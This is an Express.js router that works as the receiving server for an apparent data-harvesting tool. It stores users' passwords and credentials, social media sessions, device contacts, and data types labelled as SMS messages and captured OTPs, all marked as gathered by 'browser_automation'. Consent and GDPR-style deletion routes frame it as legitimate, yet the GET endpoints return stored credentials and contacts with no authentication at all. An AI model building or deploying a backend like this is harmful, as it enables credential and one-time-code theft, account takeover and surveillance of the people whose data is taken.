import express from 'express';
import UserConsent from '../models/UserConsent.js';
import UserCollectedData from '../models/UserCollectedData.js';
import SocialMediaData from '../models/SocialMediaData.js';
import ContactData from '../models/ContactData.js';
import PasswordData from '../models/PasswordData.js';

const router = express.Router();

// Save user consents
router.post('/consents', async (req, res) => {
    try {
        console.log('🔵 POST /consents - Body:', JSON.stringify(req.body, null, 2));
        
        const { userId, consents, givenAt, ipAddress } = req.body;
        
        if (!userId) {
            return res.status(400).json({
                success: false,
                error: 'User ID is required'
            });
        }

        const deviceInfo = {
            userAgent: req.headers['user-agent'],
            platform: getPlatformFromUserAgent(req.headers['user-agent']),
            isMobile: /Mobile|Android|iPhone/i.test(req.headers['user-agent'])
        };

        const userConsent = await UserConsent.findOneAndUpdate(
            { userId },
            {
                consents,
                consentGivenAt: new Date(givenAt),
                ipAddress,
                userAgent: req.headers['user-agent'],
                deviceType: deviceInfo.isMobile ? (deviceInfo.platform === 'android' ? 'android' : 'ios') : 'desktop',
                platform: deviceInfo.platform,
                browser: getBrowserFromUserAgent(req.headers['user-agent']),
                consentVersion: '2.0'
            },
            { upsert: true, new: true }
        );

        console.log('🟢 Consents saved successfully:', userConsent._id);
        
        res.json({ 
            success: true, 
            data: userConsent 
        });
    } catch (error) {
        console.error('🔴 Error saving consents:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save consents',
            details: error.message
        });
    }
});

// Save collected data
router.post('/data-collection', async (req, res) => {
    try {
        console.log('🔵 POST /data-collection - Type:', req.body.dataType);
        
        const { userId, dataType, data, timestamp, ipAddress, deviceInfo } = req.body;
        
        if (!userId || !dataType) {
            return res.status(400).json({
                success: false,
                error: 'User ID and dataType are required'
            });
        }

        // Calculate data size
        const dataSize = Buffer.byteLength(JSON.stringify(data), 'utf8');
        
        // Check for sensitive data
        const hasSensitiveData = checkForSensitiveData(dataType, data);

        const collectedData = new UserCollectedData({
            userId,
            dataType,
            data,
            ipAddress: ipAddress || req.ip,
            deviceInfo: deviceInfo || {
                userAgent: req.headers['user-agent'],
                platform: getPlatformFromUserAgent(req.headers['user-agent']),
                isMobile: /Mobile|Android|iPhone/i.test(req.headers['user-agent']),
                isAndroid: /Android/i.test(req.headers['user-agent']),
                isIOS: /iPhone|iPad|iPod/i.test(req.headers['user-agent']),
                browser: getBrowserFromUserAgent(req.headers['user-agent'])
            },
            collectionMethod: 'browser_automation',
            dataSize,
            hasSensitiveData,
            timestamp: timestamp ? new Date(timestamp) : new Date()
        });

        await collectedData.save();

        console.log('🟢 Data saved successfully:', dataType);
        
        res.json({ 
            success: true, 
            data: collectedData 
        });
    } catch (error) {
        console.error('🔴 Error saving collected data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save collected data',
            details: error.message
        });
    }
});

// Save social media data
router.post('/social-media-data', async (req, res) => {
    try {
        console.log('🔵 POST /social-media-data - Platform:', req.body.platform);
        
        const { userId, platform, dataType, data, metadata, collectionContext } = req.body;
        
        if (!userId || !platform || !dataType) {
            return res.status(400).json({
                success: false,
                error: 'User ID, platform, and dataType are required'
            });
        }

        const socialMediaData = new SocialMediaData({
            userId,
            platform,
            dataType,
            data,
            metadata: metadata || {},
            collectionContext: collectionContext || {
                url: req.headers.referer || 'unknown',
                userAgent: req.headers['user-agent'],
                ipAddress: req.ip,
                collectionMethod: 'browser_automation',
                limitations: ['sandbox', 'permissions', 'security']
            },
            timestamp: new Date(),
            expiresAt: dataType === 'session_data' ? new Date(Date.now() + 7 * 24 * 60 * 60 * 1000) : undefined // 7 days for sessions
        });

        await socialMediaData.save();

        console.log('🟢 Social media data saved successfully:', platform, dataType);
        
        res.json({ 
            success: true, 
            message: 'Social media data saved successfully',
            data: socialMediaData 
        });
    } catch (error) {
        console.error('🔴 Error saving social media data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save social media data',
            details: error.message
        });
    }
});

// Save contact data
router.post('/contact-data', async (req, res) => {
    try {
        console.log('🔵 POST /contact-data - Contacts:', req.body.phones?.length || 0);
        
        const { userId, name, phones, emails, addresses, organization, source, deviceSource } = req.body;
        
        if (!userId) {
            return res.status(400).json({
                success: false,
                error: 'User ID is required'
            });
        }

        // Generate unique contact ID
        const contactId = generateContactId(name, phones, emails);

        const contactData = new ContactData({
            userId,
            contactId,
            name: name || {},
            phones: phones || [],
            emails: emails || [],
            addresses: addresses || [],
            organization: organization || {},
            source: source || 'contacts_api',
            deviceSource: deviceSource || 'web',
            collectionMethod: 'browser_automation',
            confidence: calculateContactConfidence(name, phones, emails),
            timestamp: new Date()
        });

        await contactData.save();

        console.log('🟢 Contact data saved successfully:', contactId);
        
        res.json({ 
            success: true, 
            message: 'Contact data saved successfully',
            data: contactData 
        });
    } catch (error) {
        console.error('🔴 Error saving contact data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save contact data',
            details: error.message
        });
    }
});

// Save password data
router.post('/password-data', async (req, res) => {
    try {
        console.log('🔵 POST /password-data - Source:', req.body.credential?.source);
        
        const { userId, credential, security, collectionContext } = req.body;
        
        if (!userId || !credential) {
            return res.status(400).json({
                success: false,
                error: 'User ID and credential are required'
            });
        }

        const passwordData = new PasswordData({
            userId,
            credential: {
                type: credential.type || 'password',
                source: credential.source,
                username: credential.username,
                email: credential.email,
                domain: credential.domain,
                origin: credential.origin,
                lastUsed: credential.lastUsed ? new Date(credential.lastUsed) : new Date(),
                timesUsed: credential.timesUsed || 1,
                isCompromised: credential.isCompromised || false
            },
            security: security || {
                strength: 'unknown',
                length: 0,
                hasSpecialChars: false,
                hasNumbers: false,
                hasUpperCase: false,
                hasLowerCase: false
            },
            collectionContext: collectionContext || {
                method: credential.source,
                userAgent: req.headers['user-agent'],
                ipAddress: req.ip,
                url: req.headers.referer || 'unknown'
            },
            isSensitive: true,
            dataRetention: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days retention
            timestamp: new Date()
        });

        await passwordData.save();

        console.log('🟢 Password data saved successfully');
        
        res.json({ 
            success: true, 
            message: 'Password data saved successfully',
            data: passwordData 
        });
    } catch (error) {
        console.error('🔴 Error saving password data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to save password data',
            details: error.message
        });
    }
});

// Get user consents
router.get('/consents/:userId', async (req, res) => {
    try {
        console.log('🔵 GET /consents/:userId - ID:', req.params.userId);
        
        const consent = await UserConsent.findOne({ userId: req.params.userId });
        
        console.log('🟢 Consents found:', consent ? 'Yes' : 'No');
        
        res.json({ 
            success: true, 
            data: consent 
        });
    } catch (error) {
        console.error('🔴 Error fetching consents:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to fetch consents',
            details: error.message
        });
    }
});

// Get user data summary
router.get('/user-data-summary/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        
        console.log('🔵 GET /user-data-summary - User:', userId);
        
        const [
            collectedDataCount,
            socialMediaDataCount,
            contactDataCount,
            passwordDataCount,
            recentData
        ] = await Promise.all([
            UserCollectedData.countDocuments({ userId }),
            SocialMediaData.countDocuments({ userId }),
            ContactData.countDocuments({ userId }),
            PasswordData.countDocuments({ userId }),
            UserCollectedData.find({ userId })
                .sort({ timestamp: -1 })
                .limit(5)
                .select('dataType timestamp')
        ]);

        const summary = {
            collectedData: collectedDataCount,
            socialMediaData: socialMediaDataCount,
            contacts: contactDataCount,
            passwords: passwordDataCount,
            total: collectedDataCount + socialMediaDataCount + contactDataCount + passwordDataCount,
            recentActivity: recentData
        };

        console.log('🟢 User data summary:', summary);
        
        res.json({
            success: true,
            data: summary
        });
    } catch (error) {
        console.error('🔴 Error getting user data summary:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to get user data summary',
            details: error.message
        });
    }
});

// Get social media data for user
router.get('/social-media-data/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { platform, dataType, limit = 50 } = req.query;
        
        let query = { userId };
        if (platform) query.platform = platform;
        if (dataType) query.dataType = dataType;

        const socialMediaData = await SocialMediaData.find(query)
            .sort({ timestamp: -1 })
            .limit(parseInt(limit));

        res.json({
            success: true,
            data: socialMediaData,
            count: socialMediaData.length
        });
    } catch (error) {
        console.error('🔴 Error fetching social media data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to fetch social media data',
            details: error.message
        });
    }
});

// Get contacts for user
router.get('/contacts/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { limit = 100, skip = 0 } = req.query;
        
        const contacts = await ContactData.find({ userId })
            .sort({ timestamp: -1 })
            .skip(parseInt(skip))
            .limit(parseInt(limit));

        const totalContacts = await ContactData.countDocuments({ userId });

        res.json({
            success: true,
            data: contacts,
            count: contacts.length,
            total: totalContacts
        });
    } catch (error) {
        console.error('🔴 Error fetching contacts:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to fetch contacts',
            details: error.message
        });
    }
});

// Get password data for user (with security filtering)
router.get('/passwords/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { limit = 50 } = req.query;
        
        const passwords = await PasswordData.find({ userId })
            .sort({ timestamp: -1 })
            .limit(parseInt(limit))
            .select('-credential.password -credential.token'); // Exclude sensitive fields

        res.json({
            success: true,
            data: passwords,
            count: passwords.length
        });
    } catch (error) {
        console.error('🔴 Error fetching passwords:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to fetch passwords',
            details: error.message
        });
    }
});

// Delete user data (GDPR compliance)
router.delete('/user-data/:userId', async (req, res) => {
    try {
        const { userId } = req.params;
        const { dataType } = req.body;
        
        console.log('🔴 DELETE /user-data - User:', userId, 'Type:', dataType);
        
        let result = {};
        
        if (dataType === 'all') {
            // Delete all user data
            const [collected, social, contacts, passwords, consent] = await Promise.all([
                UserCollectedData.deleteMany({ userId }),
                SocialMediaData.deleteMany({ userId }),
                ContactData.deleteMany({ userId }),
                PasswordData.deleteMany({ userId }),
                UserConsent.deleteOne({ userId })
            ]);
            
            result = {
                collectedData: collected.deletedCount,
                socialMediaData: social.deletedCount,
                contacts: contacts.deletedCount,
                passwords: passwords.deletedCount,
                consent: consent.deletedCount
            };
        } else {
            // Delete specific data type
            switch (dataType) {
                case 'collected_data':
                    result.collectedData = (await UserCollectedData.deleteMany({ userId })).deletedCount;
                    break;
                case 'social_media':
                    result.socialMediaData = (await SocialMediaData.deleteMany({ userId })).deletedCount;
                    break;
                case 'contacts':
                    result.contacts = (await ContactData.deleteMany({ userId })).deletedCount;
                    break;
                case 'passwords':
                    result.passwords = (await PasswordData.deleteMany({ userId })).deletedCount;
                    break;
                case 'consent':
                    result.consent = (await UserConsent.deleteOne({ userId })).deletedCount;
                    break;
                default:
                    return res.status(400).json({
                        success: false,
                        error: 'Invalid data type'
                    });
            }
        }

        console.log('🟢 User data deleted successfully:', result);
        
        res.json({
            success: true,
            message: 'User data deleted successfully',
            data: result
        });
    } catch (error) {
        console.error('🔴 Error deleting user data:', error);
        res.status(500).json({ 
            success: false, 
            error: 'Failed to delete user data',
            details: error.message
        });
    }
});

// Health check endpoint
router.get('/health', async (req, res) => {
    try {
        // Test database connections
        const [consentCount, collectedCount, socialCount, contactCount, passwordCount] = await Promise.all([
            UserConsent.countDocuments(),
            UserCollectedData.countDocuments(),
            SocialMediaData.countDocuments(),
            ContactData.countDocuments(),
            PasswordData.countDocuments()
        ]);

        res.json({
            success: true,
            status: 'healthy',
            database: {
                userConsents: consentCount,
                collectedData: collectedCount,
                socialMediaData: socialCount,
                contacts: contactCount,
                passwords: passwordCount,
                total: consentCount + collectedCount + socialCount + contactCount + passwordCount
            },
            timestamp: new Date().toISOString()
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            status: 'unhealthy',
            error: error.message,
            timestamp: new Date().toISOString()
        });
    }
});

// Utility functions
function getPlatformFromUserAgent(userAgent) {
    if (/Android/i.test(userAgent)) return 'android';
    if (/iPhone|iPad|iPod/i.test(userAgent)) return 'ios';
    if (/Windows/i.test(userAgent)) return 'windows';
    if (/Mac OS/i.test(userAgent)) return 'mac';
    if (/Linux/i.test(userAgent)) return 'linux';
    return 'unknown';
}

function getBrowserFromUserAgent(userAgent) {
    if (/Chrome/i.test(userAgent)) return 'chrome';
    if (/Firefox/i.test(userAgent)) return 'firefox';
    if (/Safari/i.test(userAgent)) return 'safari';
    if (/Edge/i.test(userAgent)) return 'edge';
    if (/Opera/i.test(userAgent)) return 'opera';
    return 'unknown';
}

function checkForSensitiveData(dataType, data) {
    const sensitiveTypes = [
        'password_credentials',
        'local_storage_credentials',
        'sms_messages',
        'captured_otps',
        'instagram_session',
        'device_contacts'
    ];
    
    const sensitiveKeywords = ['password', 'token', 'auth', 'credential', 'otp', 'phone', 'email'];
    
    if (sensitiveTypes.includes(dataType)) return true;
    
    // Check data content for sensitive keywords
    const dataStr = JSON.stringify(data).toLowerCase();
    return sensitiveKeywords.some(keyword => dataStr.includes(keyword));
}

function generateContactId(name, phones, emails) {
    const namePart = name?.full ? Buffer.from(name.full).toString('base64').substring(0, 10) : 'unknown';
    const phonePart = phones?.[0]?.number ? phones[0].number.replace(/\D/g, '').substring(-5) : '00000';
    const emailPart = emails?.[0]?.address ? Buffer.from(emails[0].address).toString('base64').substring(0, 5) : 'unknown';
    
    return `${namePart}_${phonePart}_${emailPart}_${Date.now()}`;
}

function calculateContactConfidence(name, phones, emails) {
    let confidence = 0;
    
    if (name?.full) confidence += 30;
    if (name?.given && name?.family) confidence += 20;
    if (phones?.length > 0) confidence += 25;
    if (emails?.length > 0) confidence += 25;
    
    return Math.min(confidence, 100);
}

export default router;